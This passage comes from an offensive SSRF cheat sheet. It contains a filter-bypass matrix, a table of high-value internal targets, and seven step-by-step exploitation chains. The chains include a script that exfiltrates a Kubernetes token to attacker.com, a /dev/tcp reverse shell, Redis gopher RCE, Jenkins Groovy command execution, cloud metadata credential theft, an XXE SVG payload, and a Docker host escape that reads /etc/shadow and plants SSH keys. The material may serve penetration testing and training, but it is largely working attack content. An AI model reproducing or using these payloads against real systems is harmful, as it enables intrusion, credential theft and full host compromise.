   `metadata_url` from client registrations are an under-tested SSRF surface. Dynamic
   client registration (RFC 7591) is the entry point to probe.

9. **FFmpeg and image processing pipelines** — Video upload features using FFmpeg and
   image processors handling SVG are consistently found vulnerable. Prioritize these in
   media-heavy apps (social platforms, file-sharing SaaS).

---

## Bypass Matrix

| Filter Type | Best Bypass | Notes |
|-------------|-------------|-------|
| Blocks `127.0.0.1` | `127.127.127.127` or decimal `2130706433` | Full /8 loopback block |
| Blocks `localhost` | `[::1]` or Unicode `ⓛⓞⓒⓐⓛⓗⓞⓢⓣ` | Case + protocol variation |
| Blocks `169.254.169.254` | `2852039166` (decimal) or `0xa9fea9fe` (hex) | Numeric encoding |
| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on whitelisted domain | URL parser confusion |
| Domain allowlist (string check only) | `127.0.0.1.nip.io`, `localtest.me`, `ip6-localhost` | Resolves to internal IP at request time |
| Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
| Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
| PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
| Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
| TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
| DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
| IMDSv2 required | gopher:// with PUT headers or 307 redirect chain | 307 preserves PUT method + body |
| XML input (DOCTYPE blocked) | XInclude (`xi:include`) or XSLT `document()` | No DOCTYPE declaration needed |
| GET-only SSRF vector | 307/308 redirect to POST/PUT target | Method preserved through redirect |
| OAuth `redirect_uri` validation | Point `jwks_uri` / `metadata_url` to internal IP | Server fetches URL to validate |

---

## High-Value Targets

| Target Stack / Feature | Why High Value | Impact |
|-----------------------|----------------|--------|
| PDF generators (wkhtmltopdf, Puppeteer, headless Chrome) | Render user HTML server-side | SSRF → IMDS → AWS creds |
| Image thumbnail / resize service | Fetches remote URL before processing | Internal port scan + metadata |
| Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
| OAuth metadata URL (`jwks_uri`, `metadata_url`) | Server fetches to validate token issuer | SSRF to internal PKI/CA |
| OAuth dynamic client registration (`/oauth/clients`) | `jwks_uri` and `redirect_uris` fetched | SSRF to any internal host |
| Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
| XML parsers with `xs:import` or XSLT | URL fetched during parsing | Blind SSRF from file processing |
| SVG upload (avatar, logo, attachment) | Server-side SVG rendering fetches `xlink:href` | SSRF → IMDS → cloud creds |
| Video upload / transcoding (FFmpeg) | FFmpeg fetches M3U8 segment URIs | SSRF → internal metadata |
| Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
| HashiCorp Consul at `127.0.0.1:8500` | Unauthenticated API registers exec health checks | SSRF → RCE on Consul host |
| Docker daemon at `127.0.0.1:2375` | Unauthenticated REST API for container ops | SSRF → privileged container → host escape |
| Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
| Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
| ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
| SMTP relay at `127.0.0.1:25` | Internal mail relay accepts unauthenticated HELO | gopher → SMTP → spoofed email → phishing |

---

## Real-World Chains

### Chain 1: Webhook SSRF → IMDSv1 → S3 Data Exfil

```
1. App allows user to configure webhook URL
2. Set webhook URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Trigger the webhook (submit a form, create a resource, etc.)
4. Response contains role name → fetch credentials:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME
5. Exfil: AccessKeyId + SecretAccessKey + SessionToken
6. Configure AWS CLI → aws s3 ls → dump all S3 buckets
7. aws secretsmanager list-secrets → dump RDS passwords, API keys, etc.

Impact: Critical — full AWS account access
Real example: Capital One breach (2019), GitLab HackerOne report #1116226
```

### Chain 2: PDF Generator SSRF → K8s Service Account → Cluster Takeover

```
1. App has HTML-to-PDF feature (report generation, invoice download)
2. Inject iframe or fetch in HTML template:
   <script>
   fetch('file:///var/run/secrets/kubernetes.io/serviceaccount/token')
     .then(r=>r.text())
     .then(t=>fetch('https://attacker.com/token?t='+t))
   </script>
3. PDF service renders HTML in headless browser inside K8s pod
4. Service account token exfilled to attacker
5. Use token with K8s API:
   curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
6. List all secrets in all namespaces → DB passwords, API keys, other service account tokens

Impact: Critical — full K8s cluster secret access
```

### Chain 3: SSRF → Redis Gopher → RCE → Reverse Shell

```
1. Find SSRF in imageUrl parameter
2. Confirm Redis at 127.0.0.1:6379 via dict://127.0.0.1:6379/info (check INFO response)
3. Generate cron-based reverse shell via Gopherus:
   python3 gopherus.py --exploit redis
   → select cronjob → enter reverse shell → copy gopher:// payload
4. Send via SSRF:
   imageUrl=gopher://127.0.0.1:6379/_%2A...ENCODED-CRON-PAYLOAD...
5. Cron executes → reverse shell on port 4444

Impact: Critical — RCE on server
```

### Chain 4: Blind SSRF → Internal Jenkins → Groovy RCE

```
1. Blind SSRF confirmed via OOB DNS callback
2. Port scan internal range: try 127.0.0.1:8080 — check error vs timeout
3. Fetch http://127.0.0.1:8080/script → Jenkins script console (often unauthenticated internally)
4. POST to /script:
   script=def+cmd="id".execute();def+out=new+StringBuffer();
   cmd.consumeProcessOutputStream(out);cmd.waitFor();println(out)
5. Response contains command output

Impact: Critical — RCE via internal Jenkins
```

### Chain 5: SSRF → ECS Task Credentials → Cross-Account Pivot

```
1. SSRF in containerized app (ECS Fargate)
2. Fetch: http://169.254.170.2/v2/metadata → extract CredentialsRelativeUri
3. Fetch: http://169.254.170.2/v2/credentials/<ID> → AWS temp creds
4. Assume role with trust policy:
   aws sts assume-role --role-arn arn:aws:iam::OTHER-ACCOUNT:role/admin --role-session-name pwned
5. Pivot to a different AWS account in the organization

Impact: Critical — cross-account AWS access
```

### Chain 6: XXE in SVG Upload → SSRF → AWS Credential Theft

```
1. App accepts SVG uploads for avatars or document attachments
2. Craft SVG with XXE external entity referencing internal IMDS:
   <?xml version="1.0"?>
   <!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
   <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
3. Upload SVG — server-side renderer (ImageMagick/Batik/wkhtmltopdf) processes it
4. Entity is resolved → IMDS response embedded in rendered output (reflected in response,
   error message, or thumbnail metadata)
5. Extract role name from response → make second request for full credentials:
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE">
6. AccessKeyId + SecretAccessKey + SessionToken extracted
7. aws sts get-caller-identity → enumerate permissions → dump S3/Secrets

Impact: Critical — AWS credential theft via file upload
```

### Chain 7: SSRF → Docker API → Privileged Container → Host Escape

```
1. SSRF found in webhook or import-URL feature
2. Confirm Docker daemon: http://127.0.0.1:2375/version → returns Docker version JSON
3. List running containers: http://127.0.0.1:2375/containers/json
4. Create privileged container via gopher:// POST (or 307 redirect chain):
   POST /containers/create → image: alpine, binds: /:/host, privileged: true
5. Start container: POST /containers/<id>/start
6. Exec reverse shell: POST /containers/<id>/exec → bash -i >& /dev/tcp/attacker.com/4444
7. Inside container: ls /host/etc → read /host/etc/shadow, add SSH key to /host/root/.ssh/

Impact: Critical — full host OS compromise via container escape
```
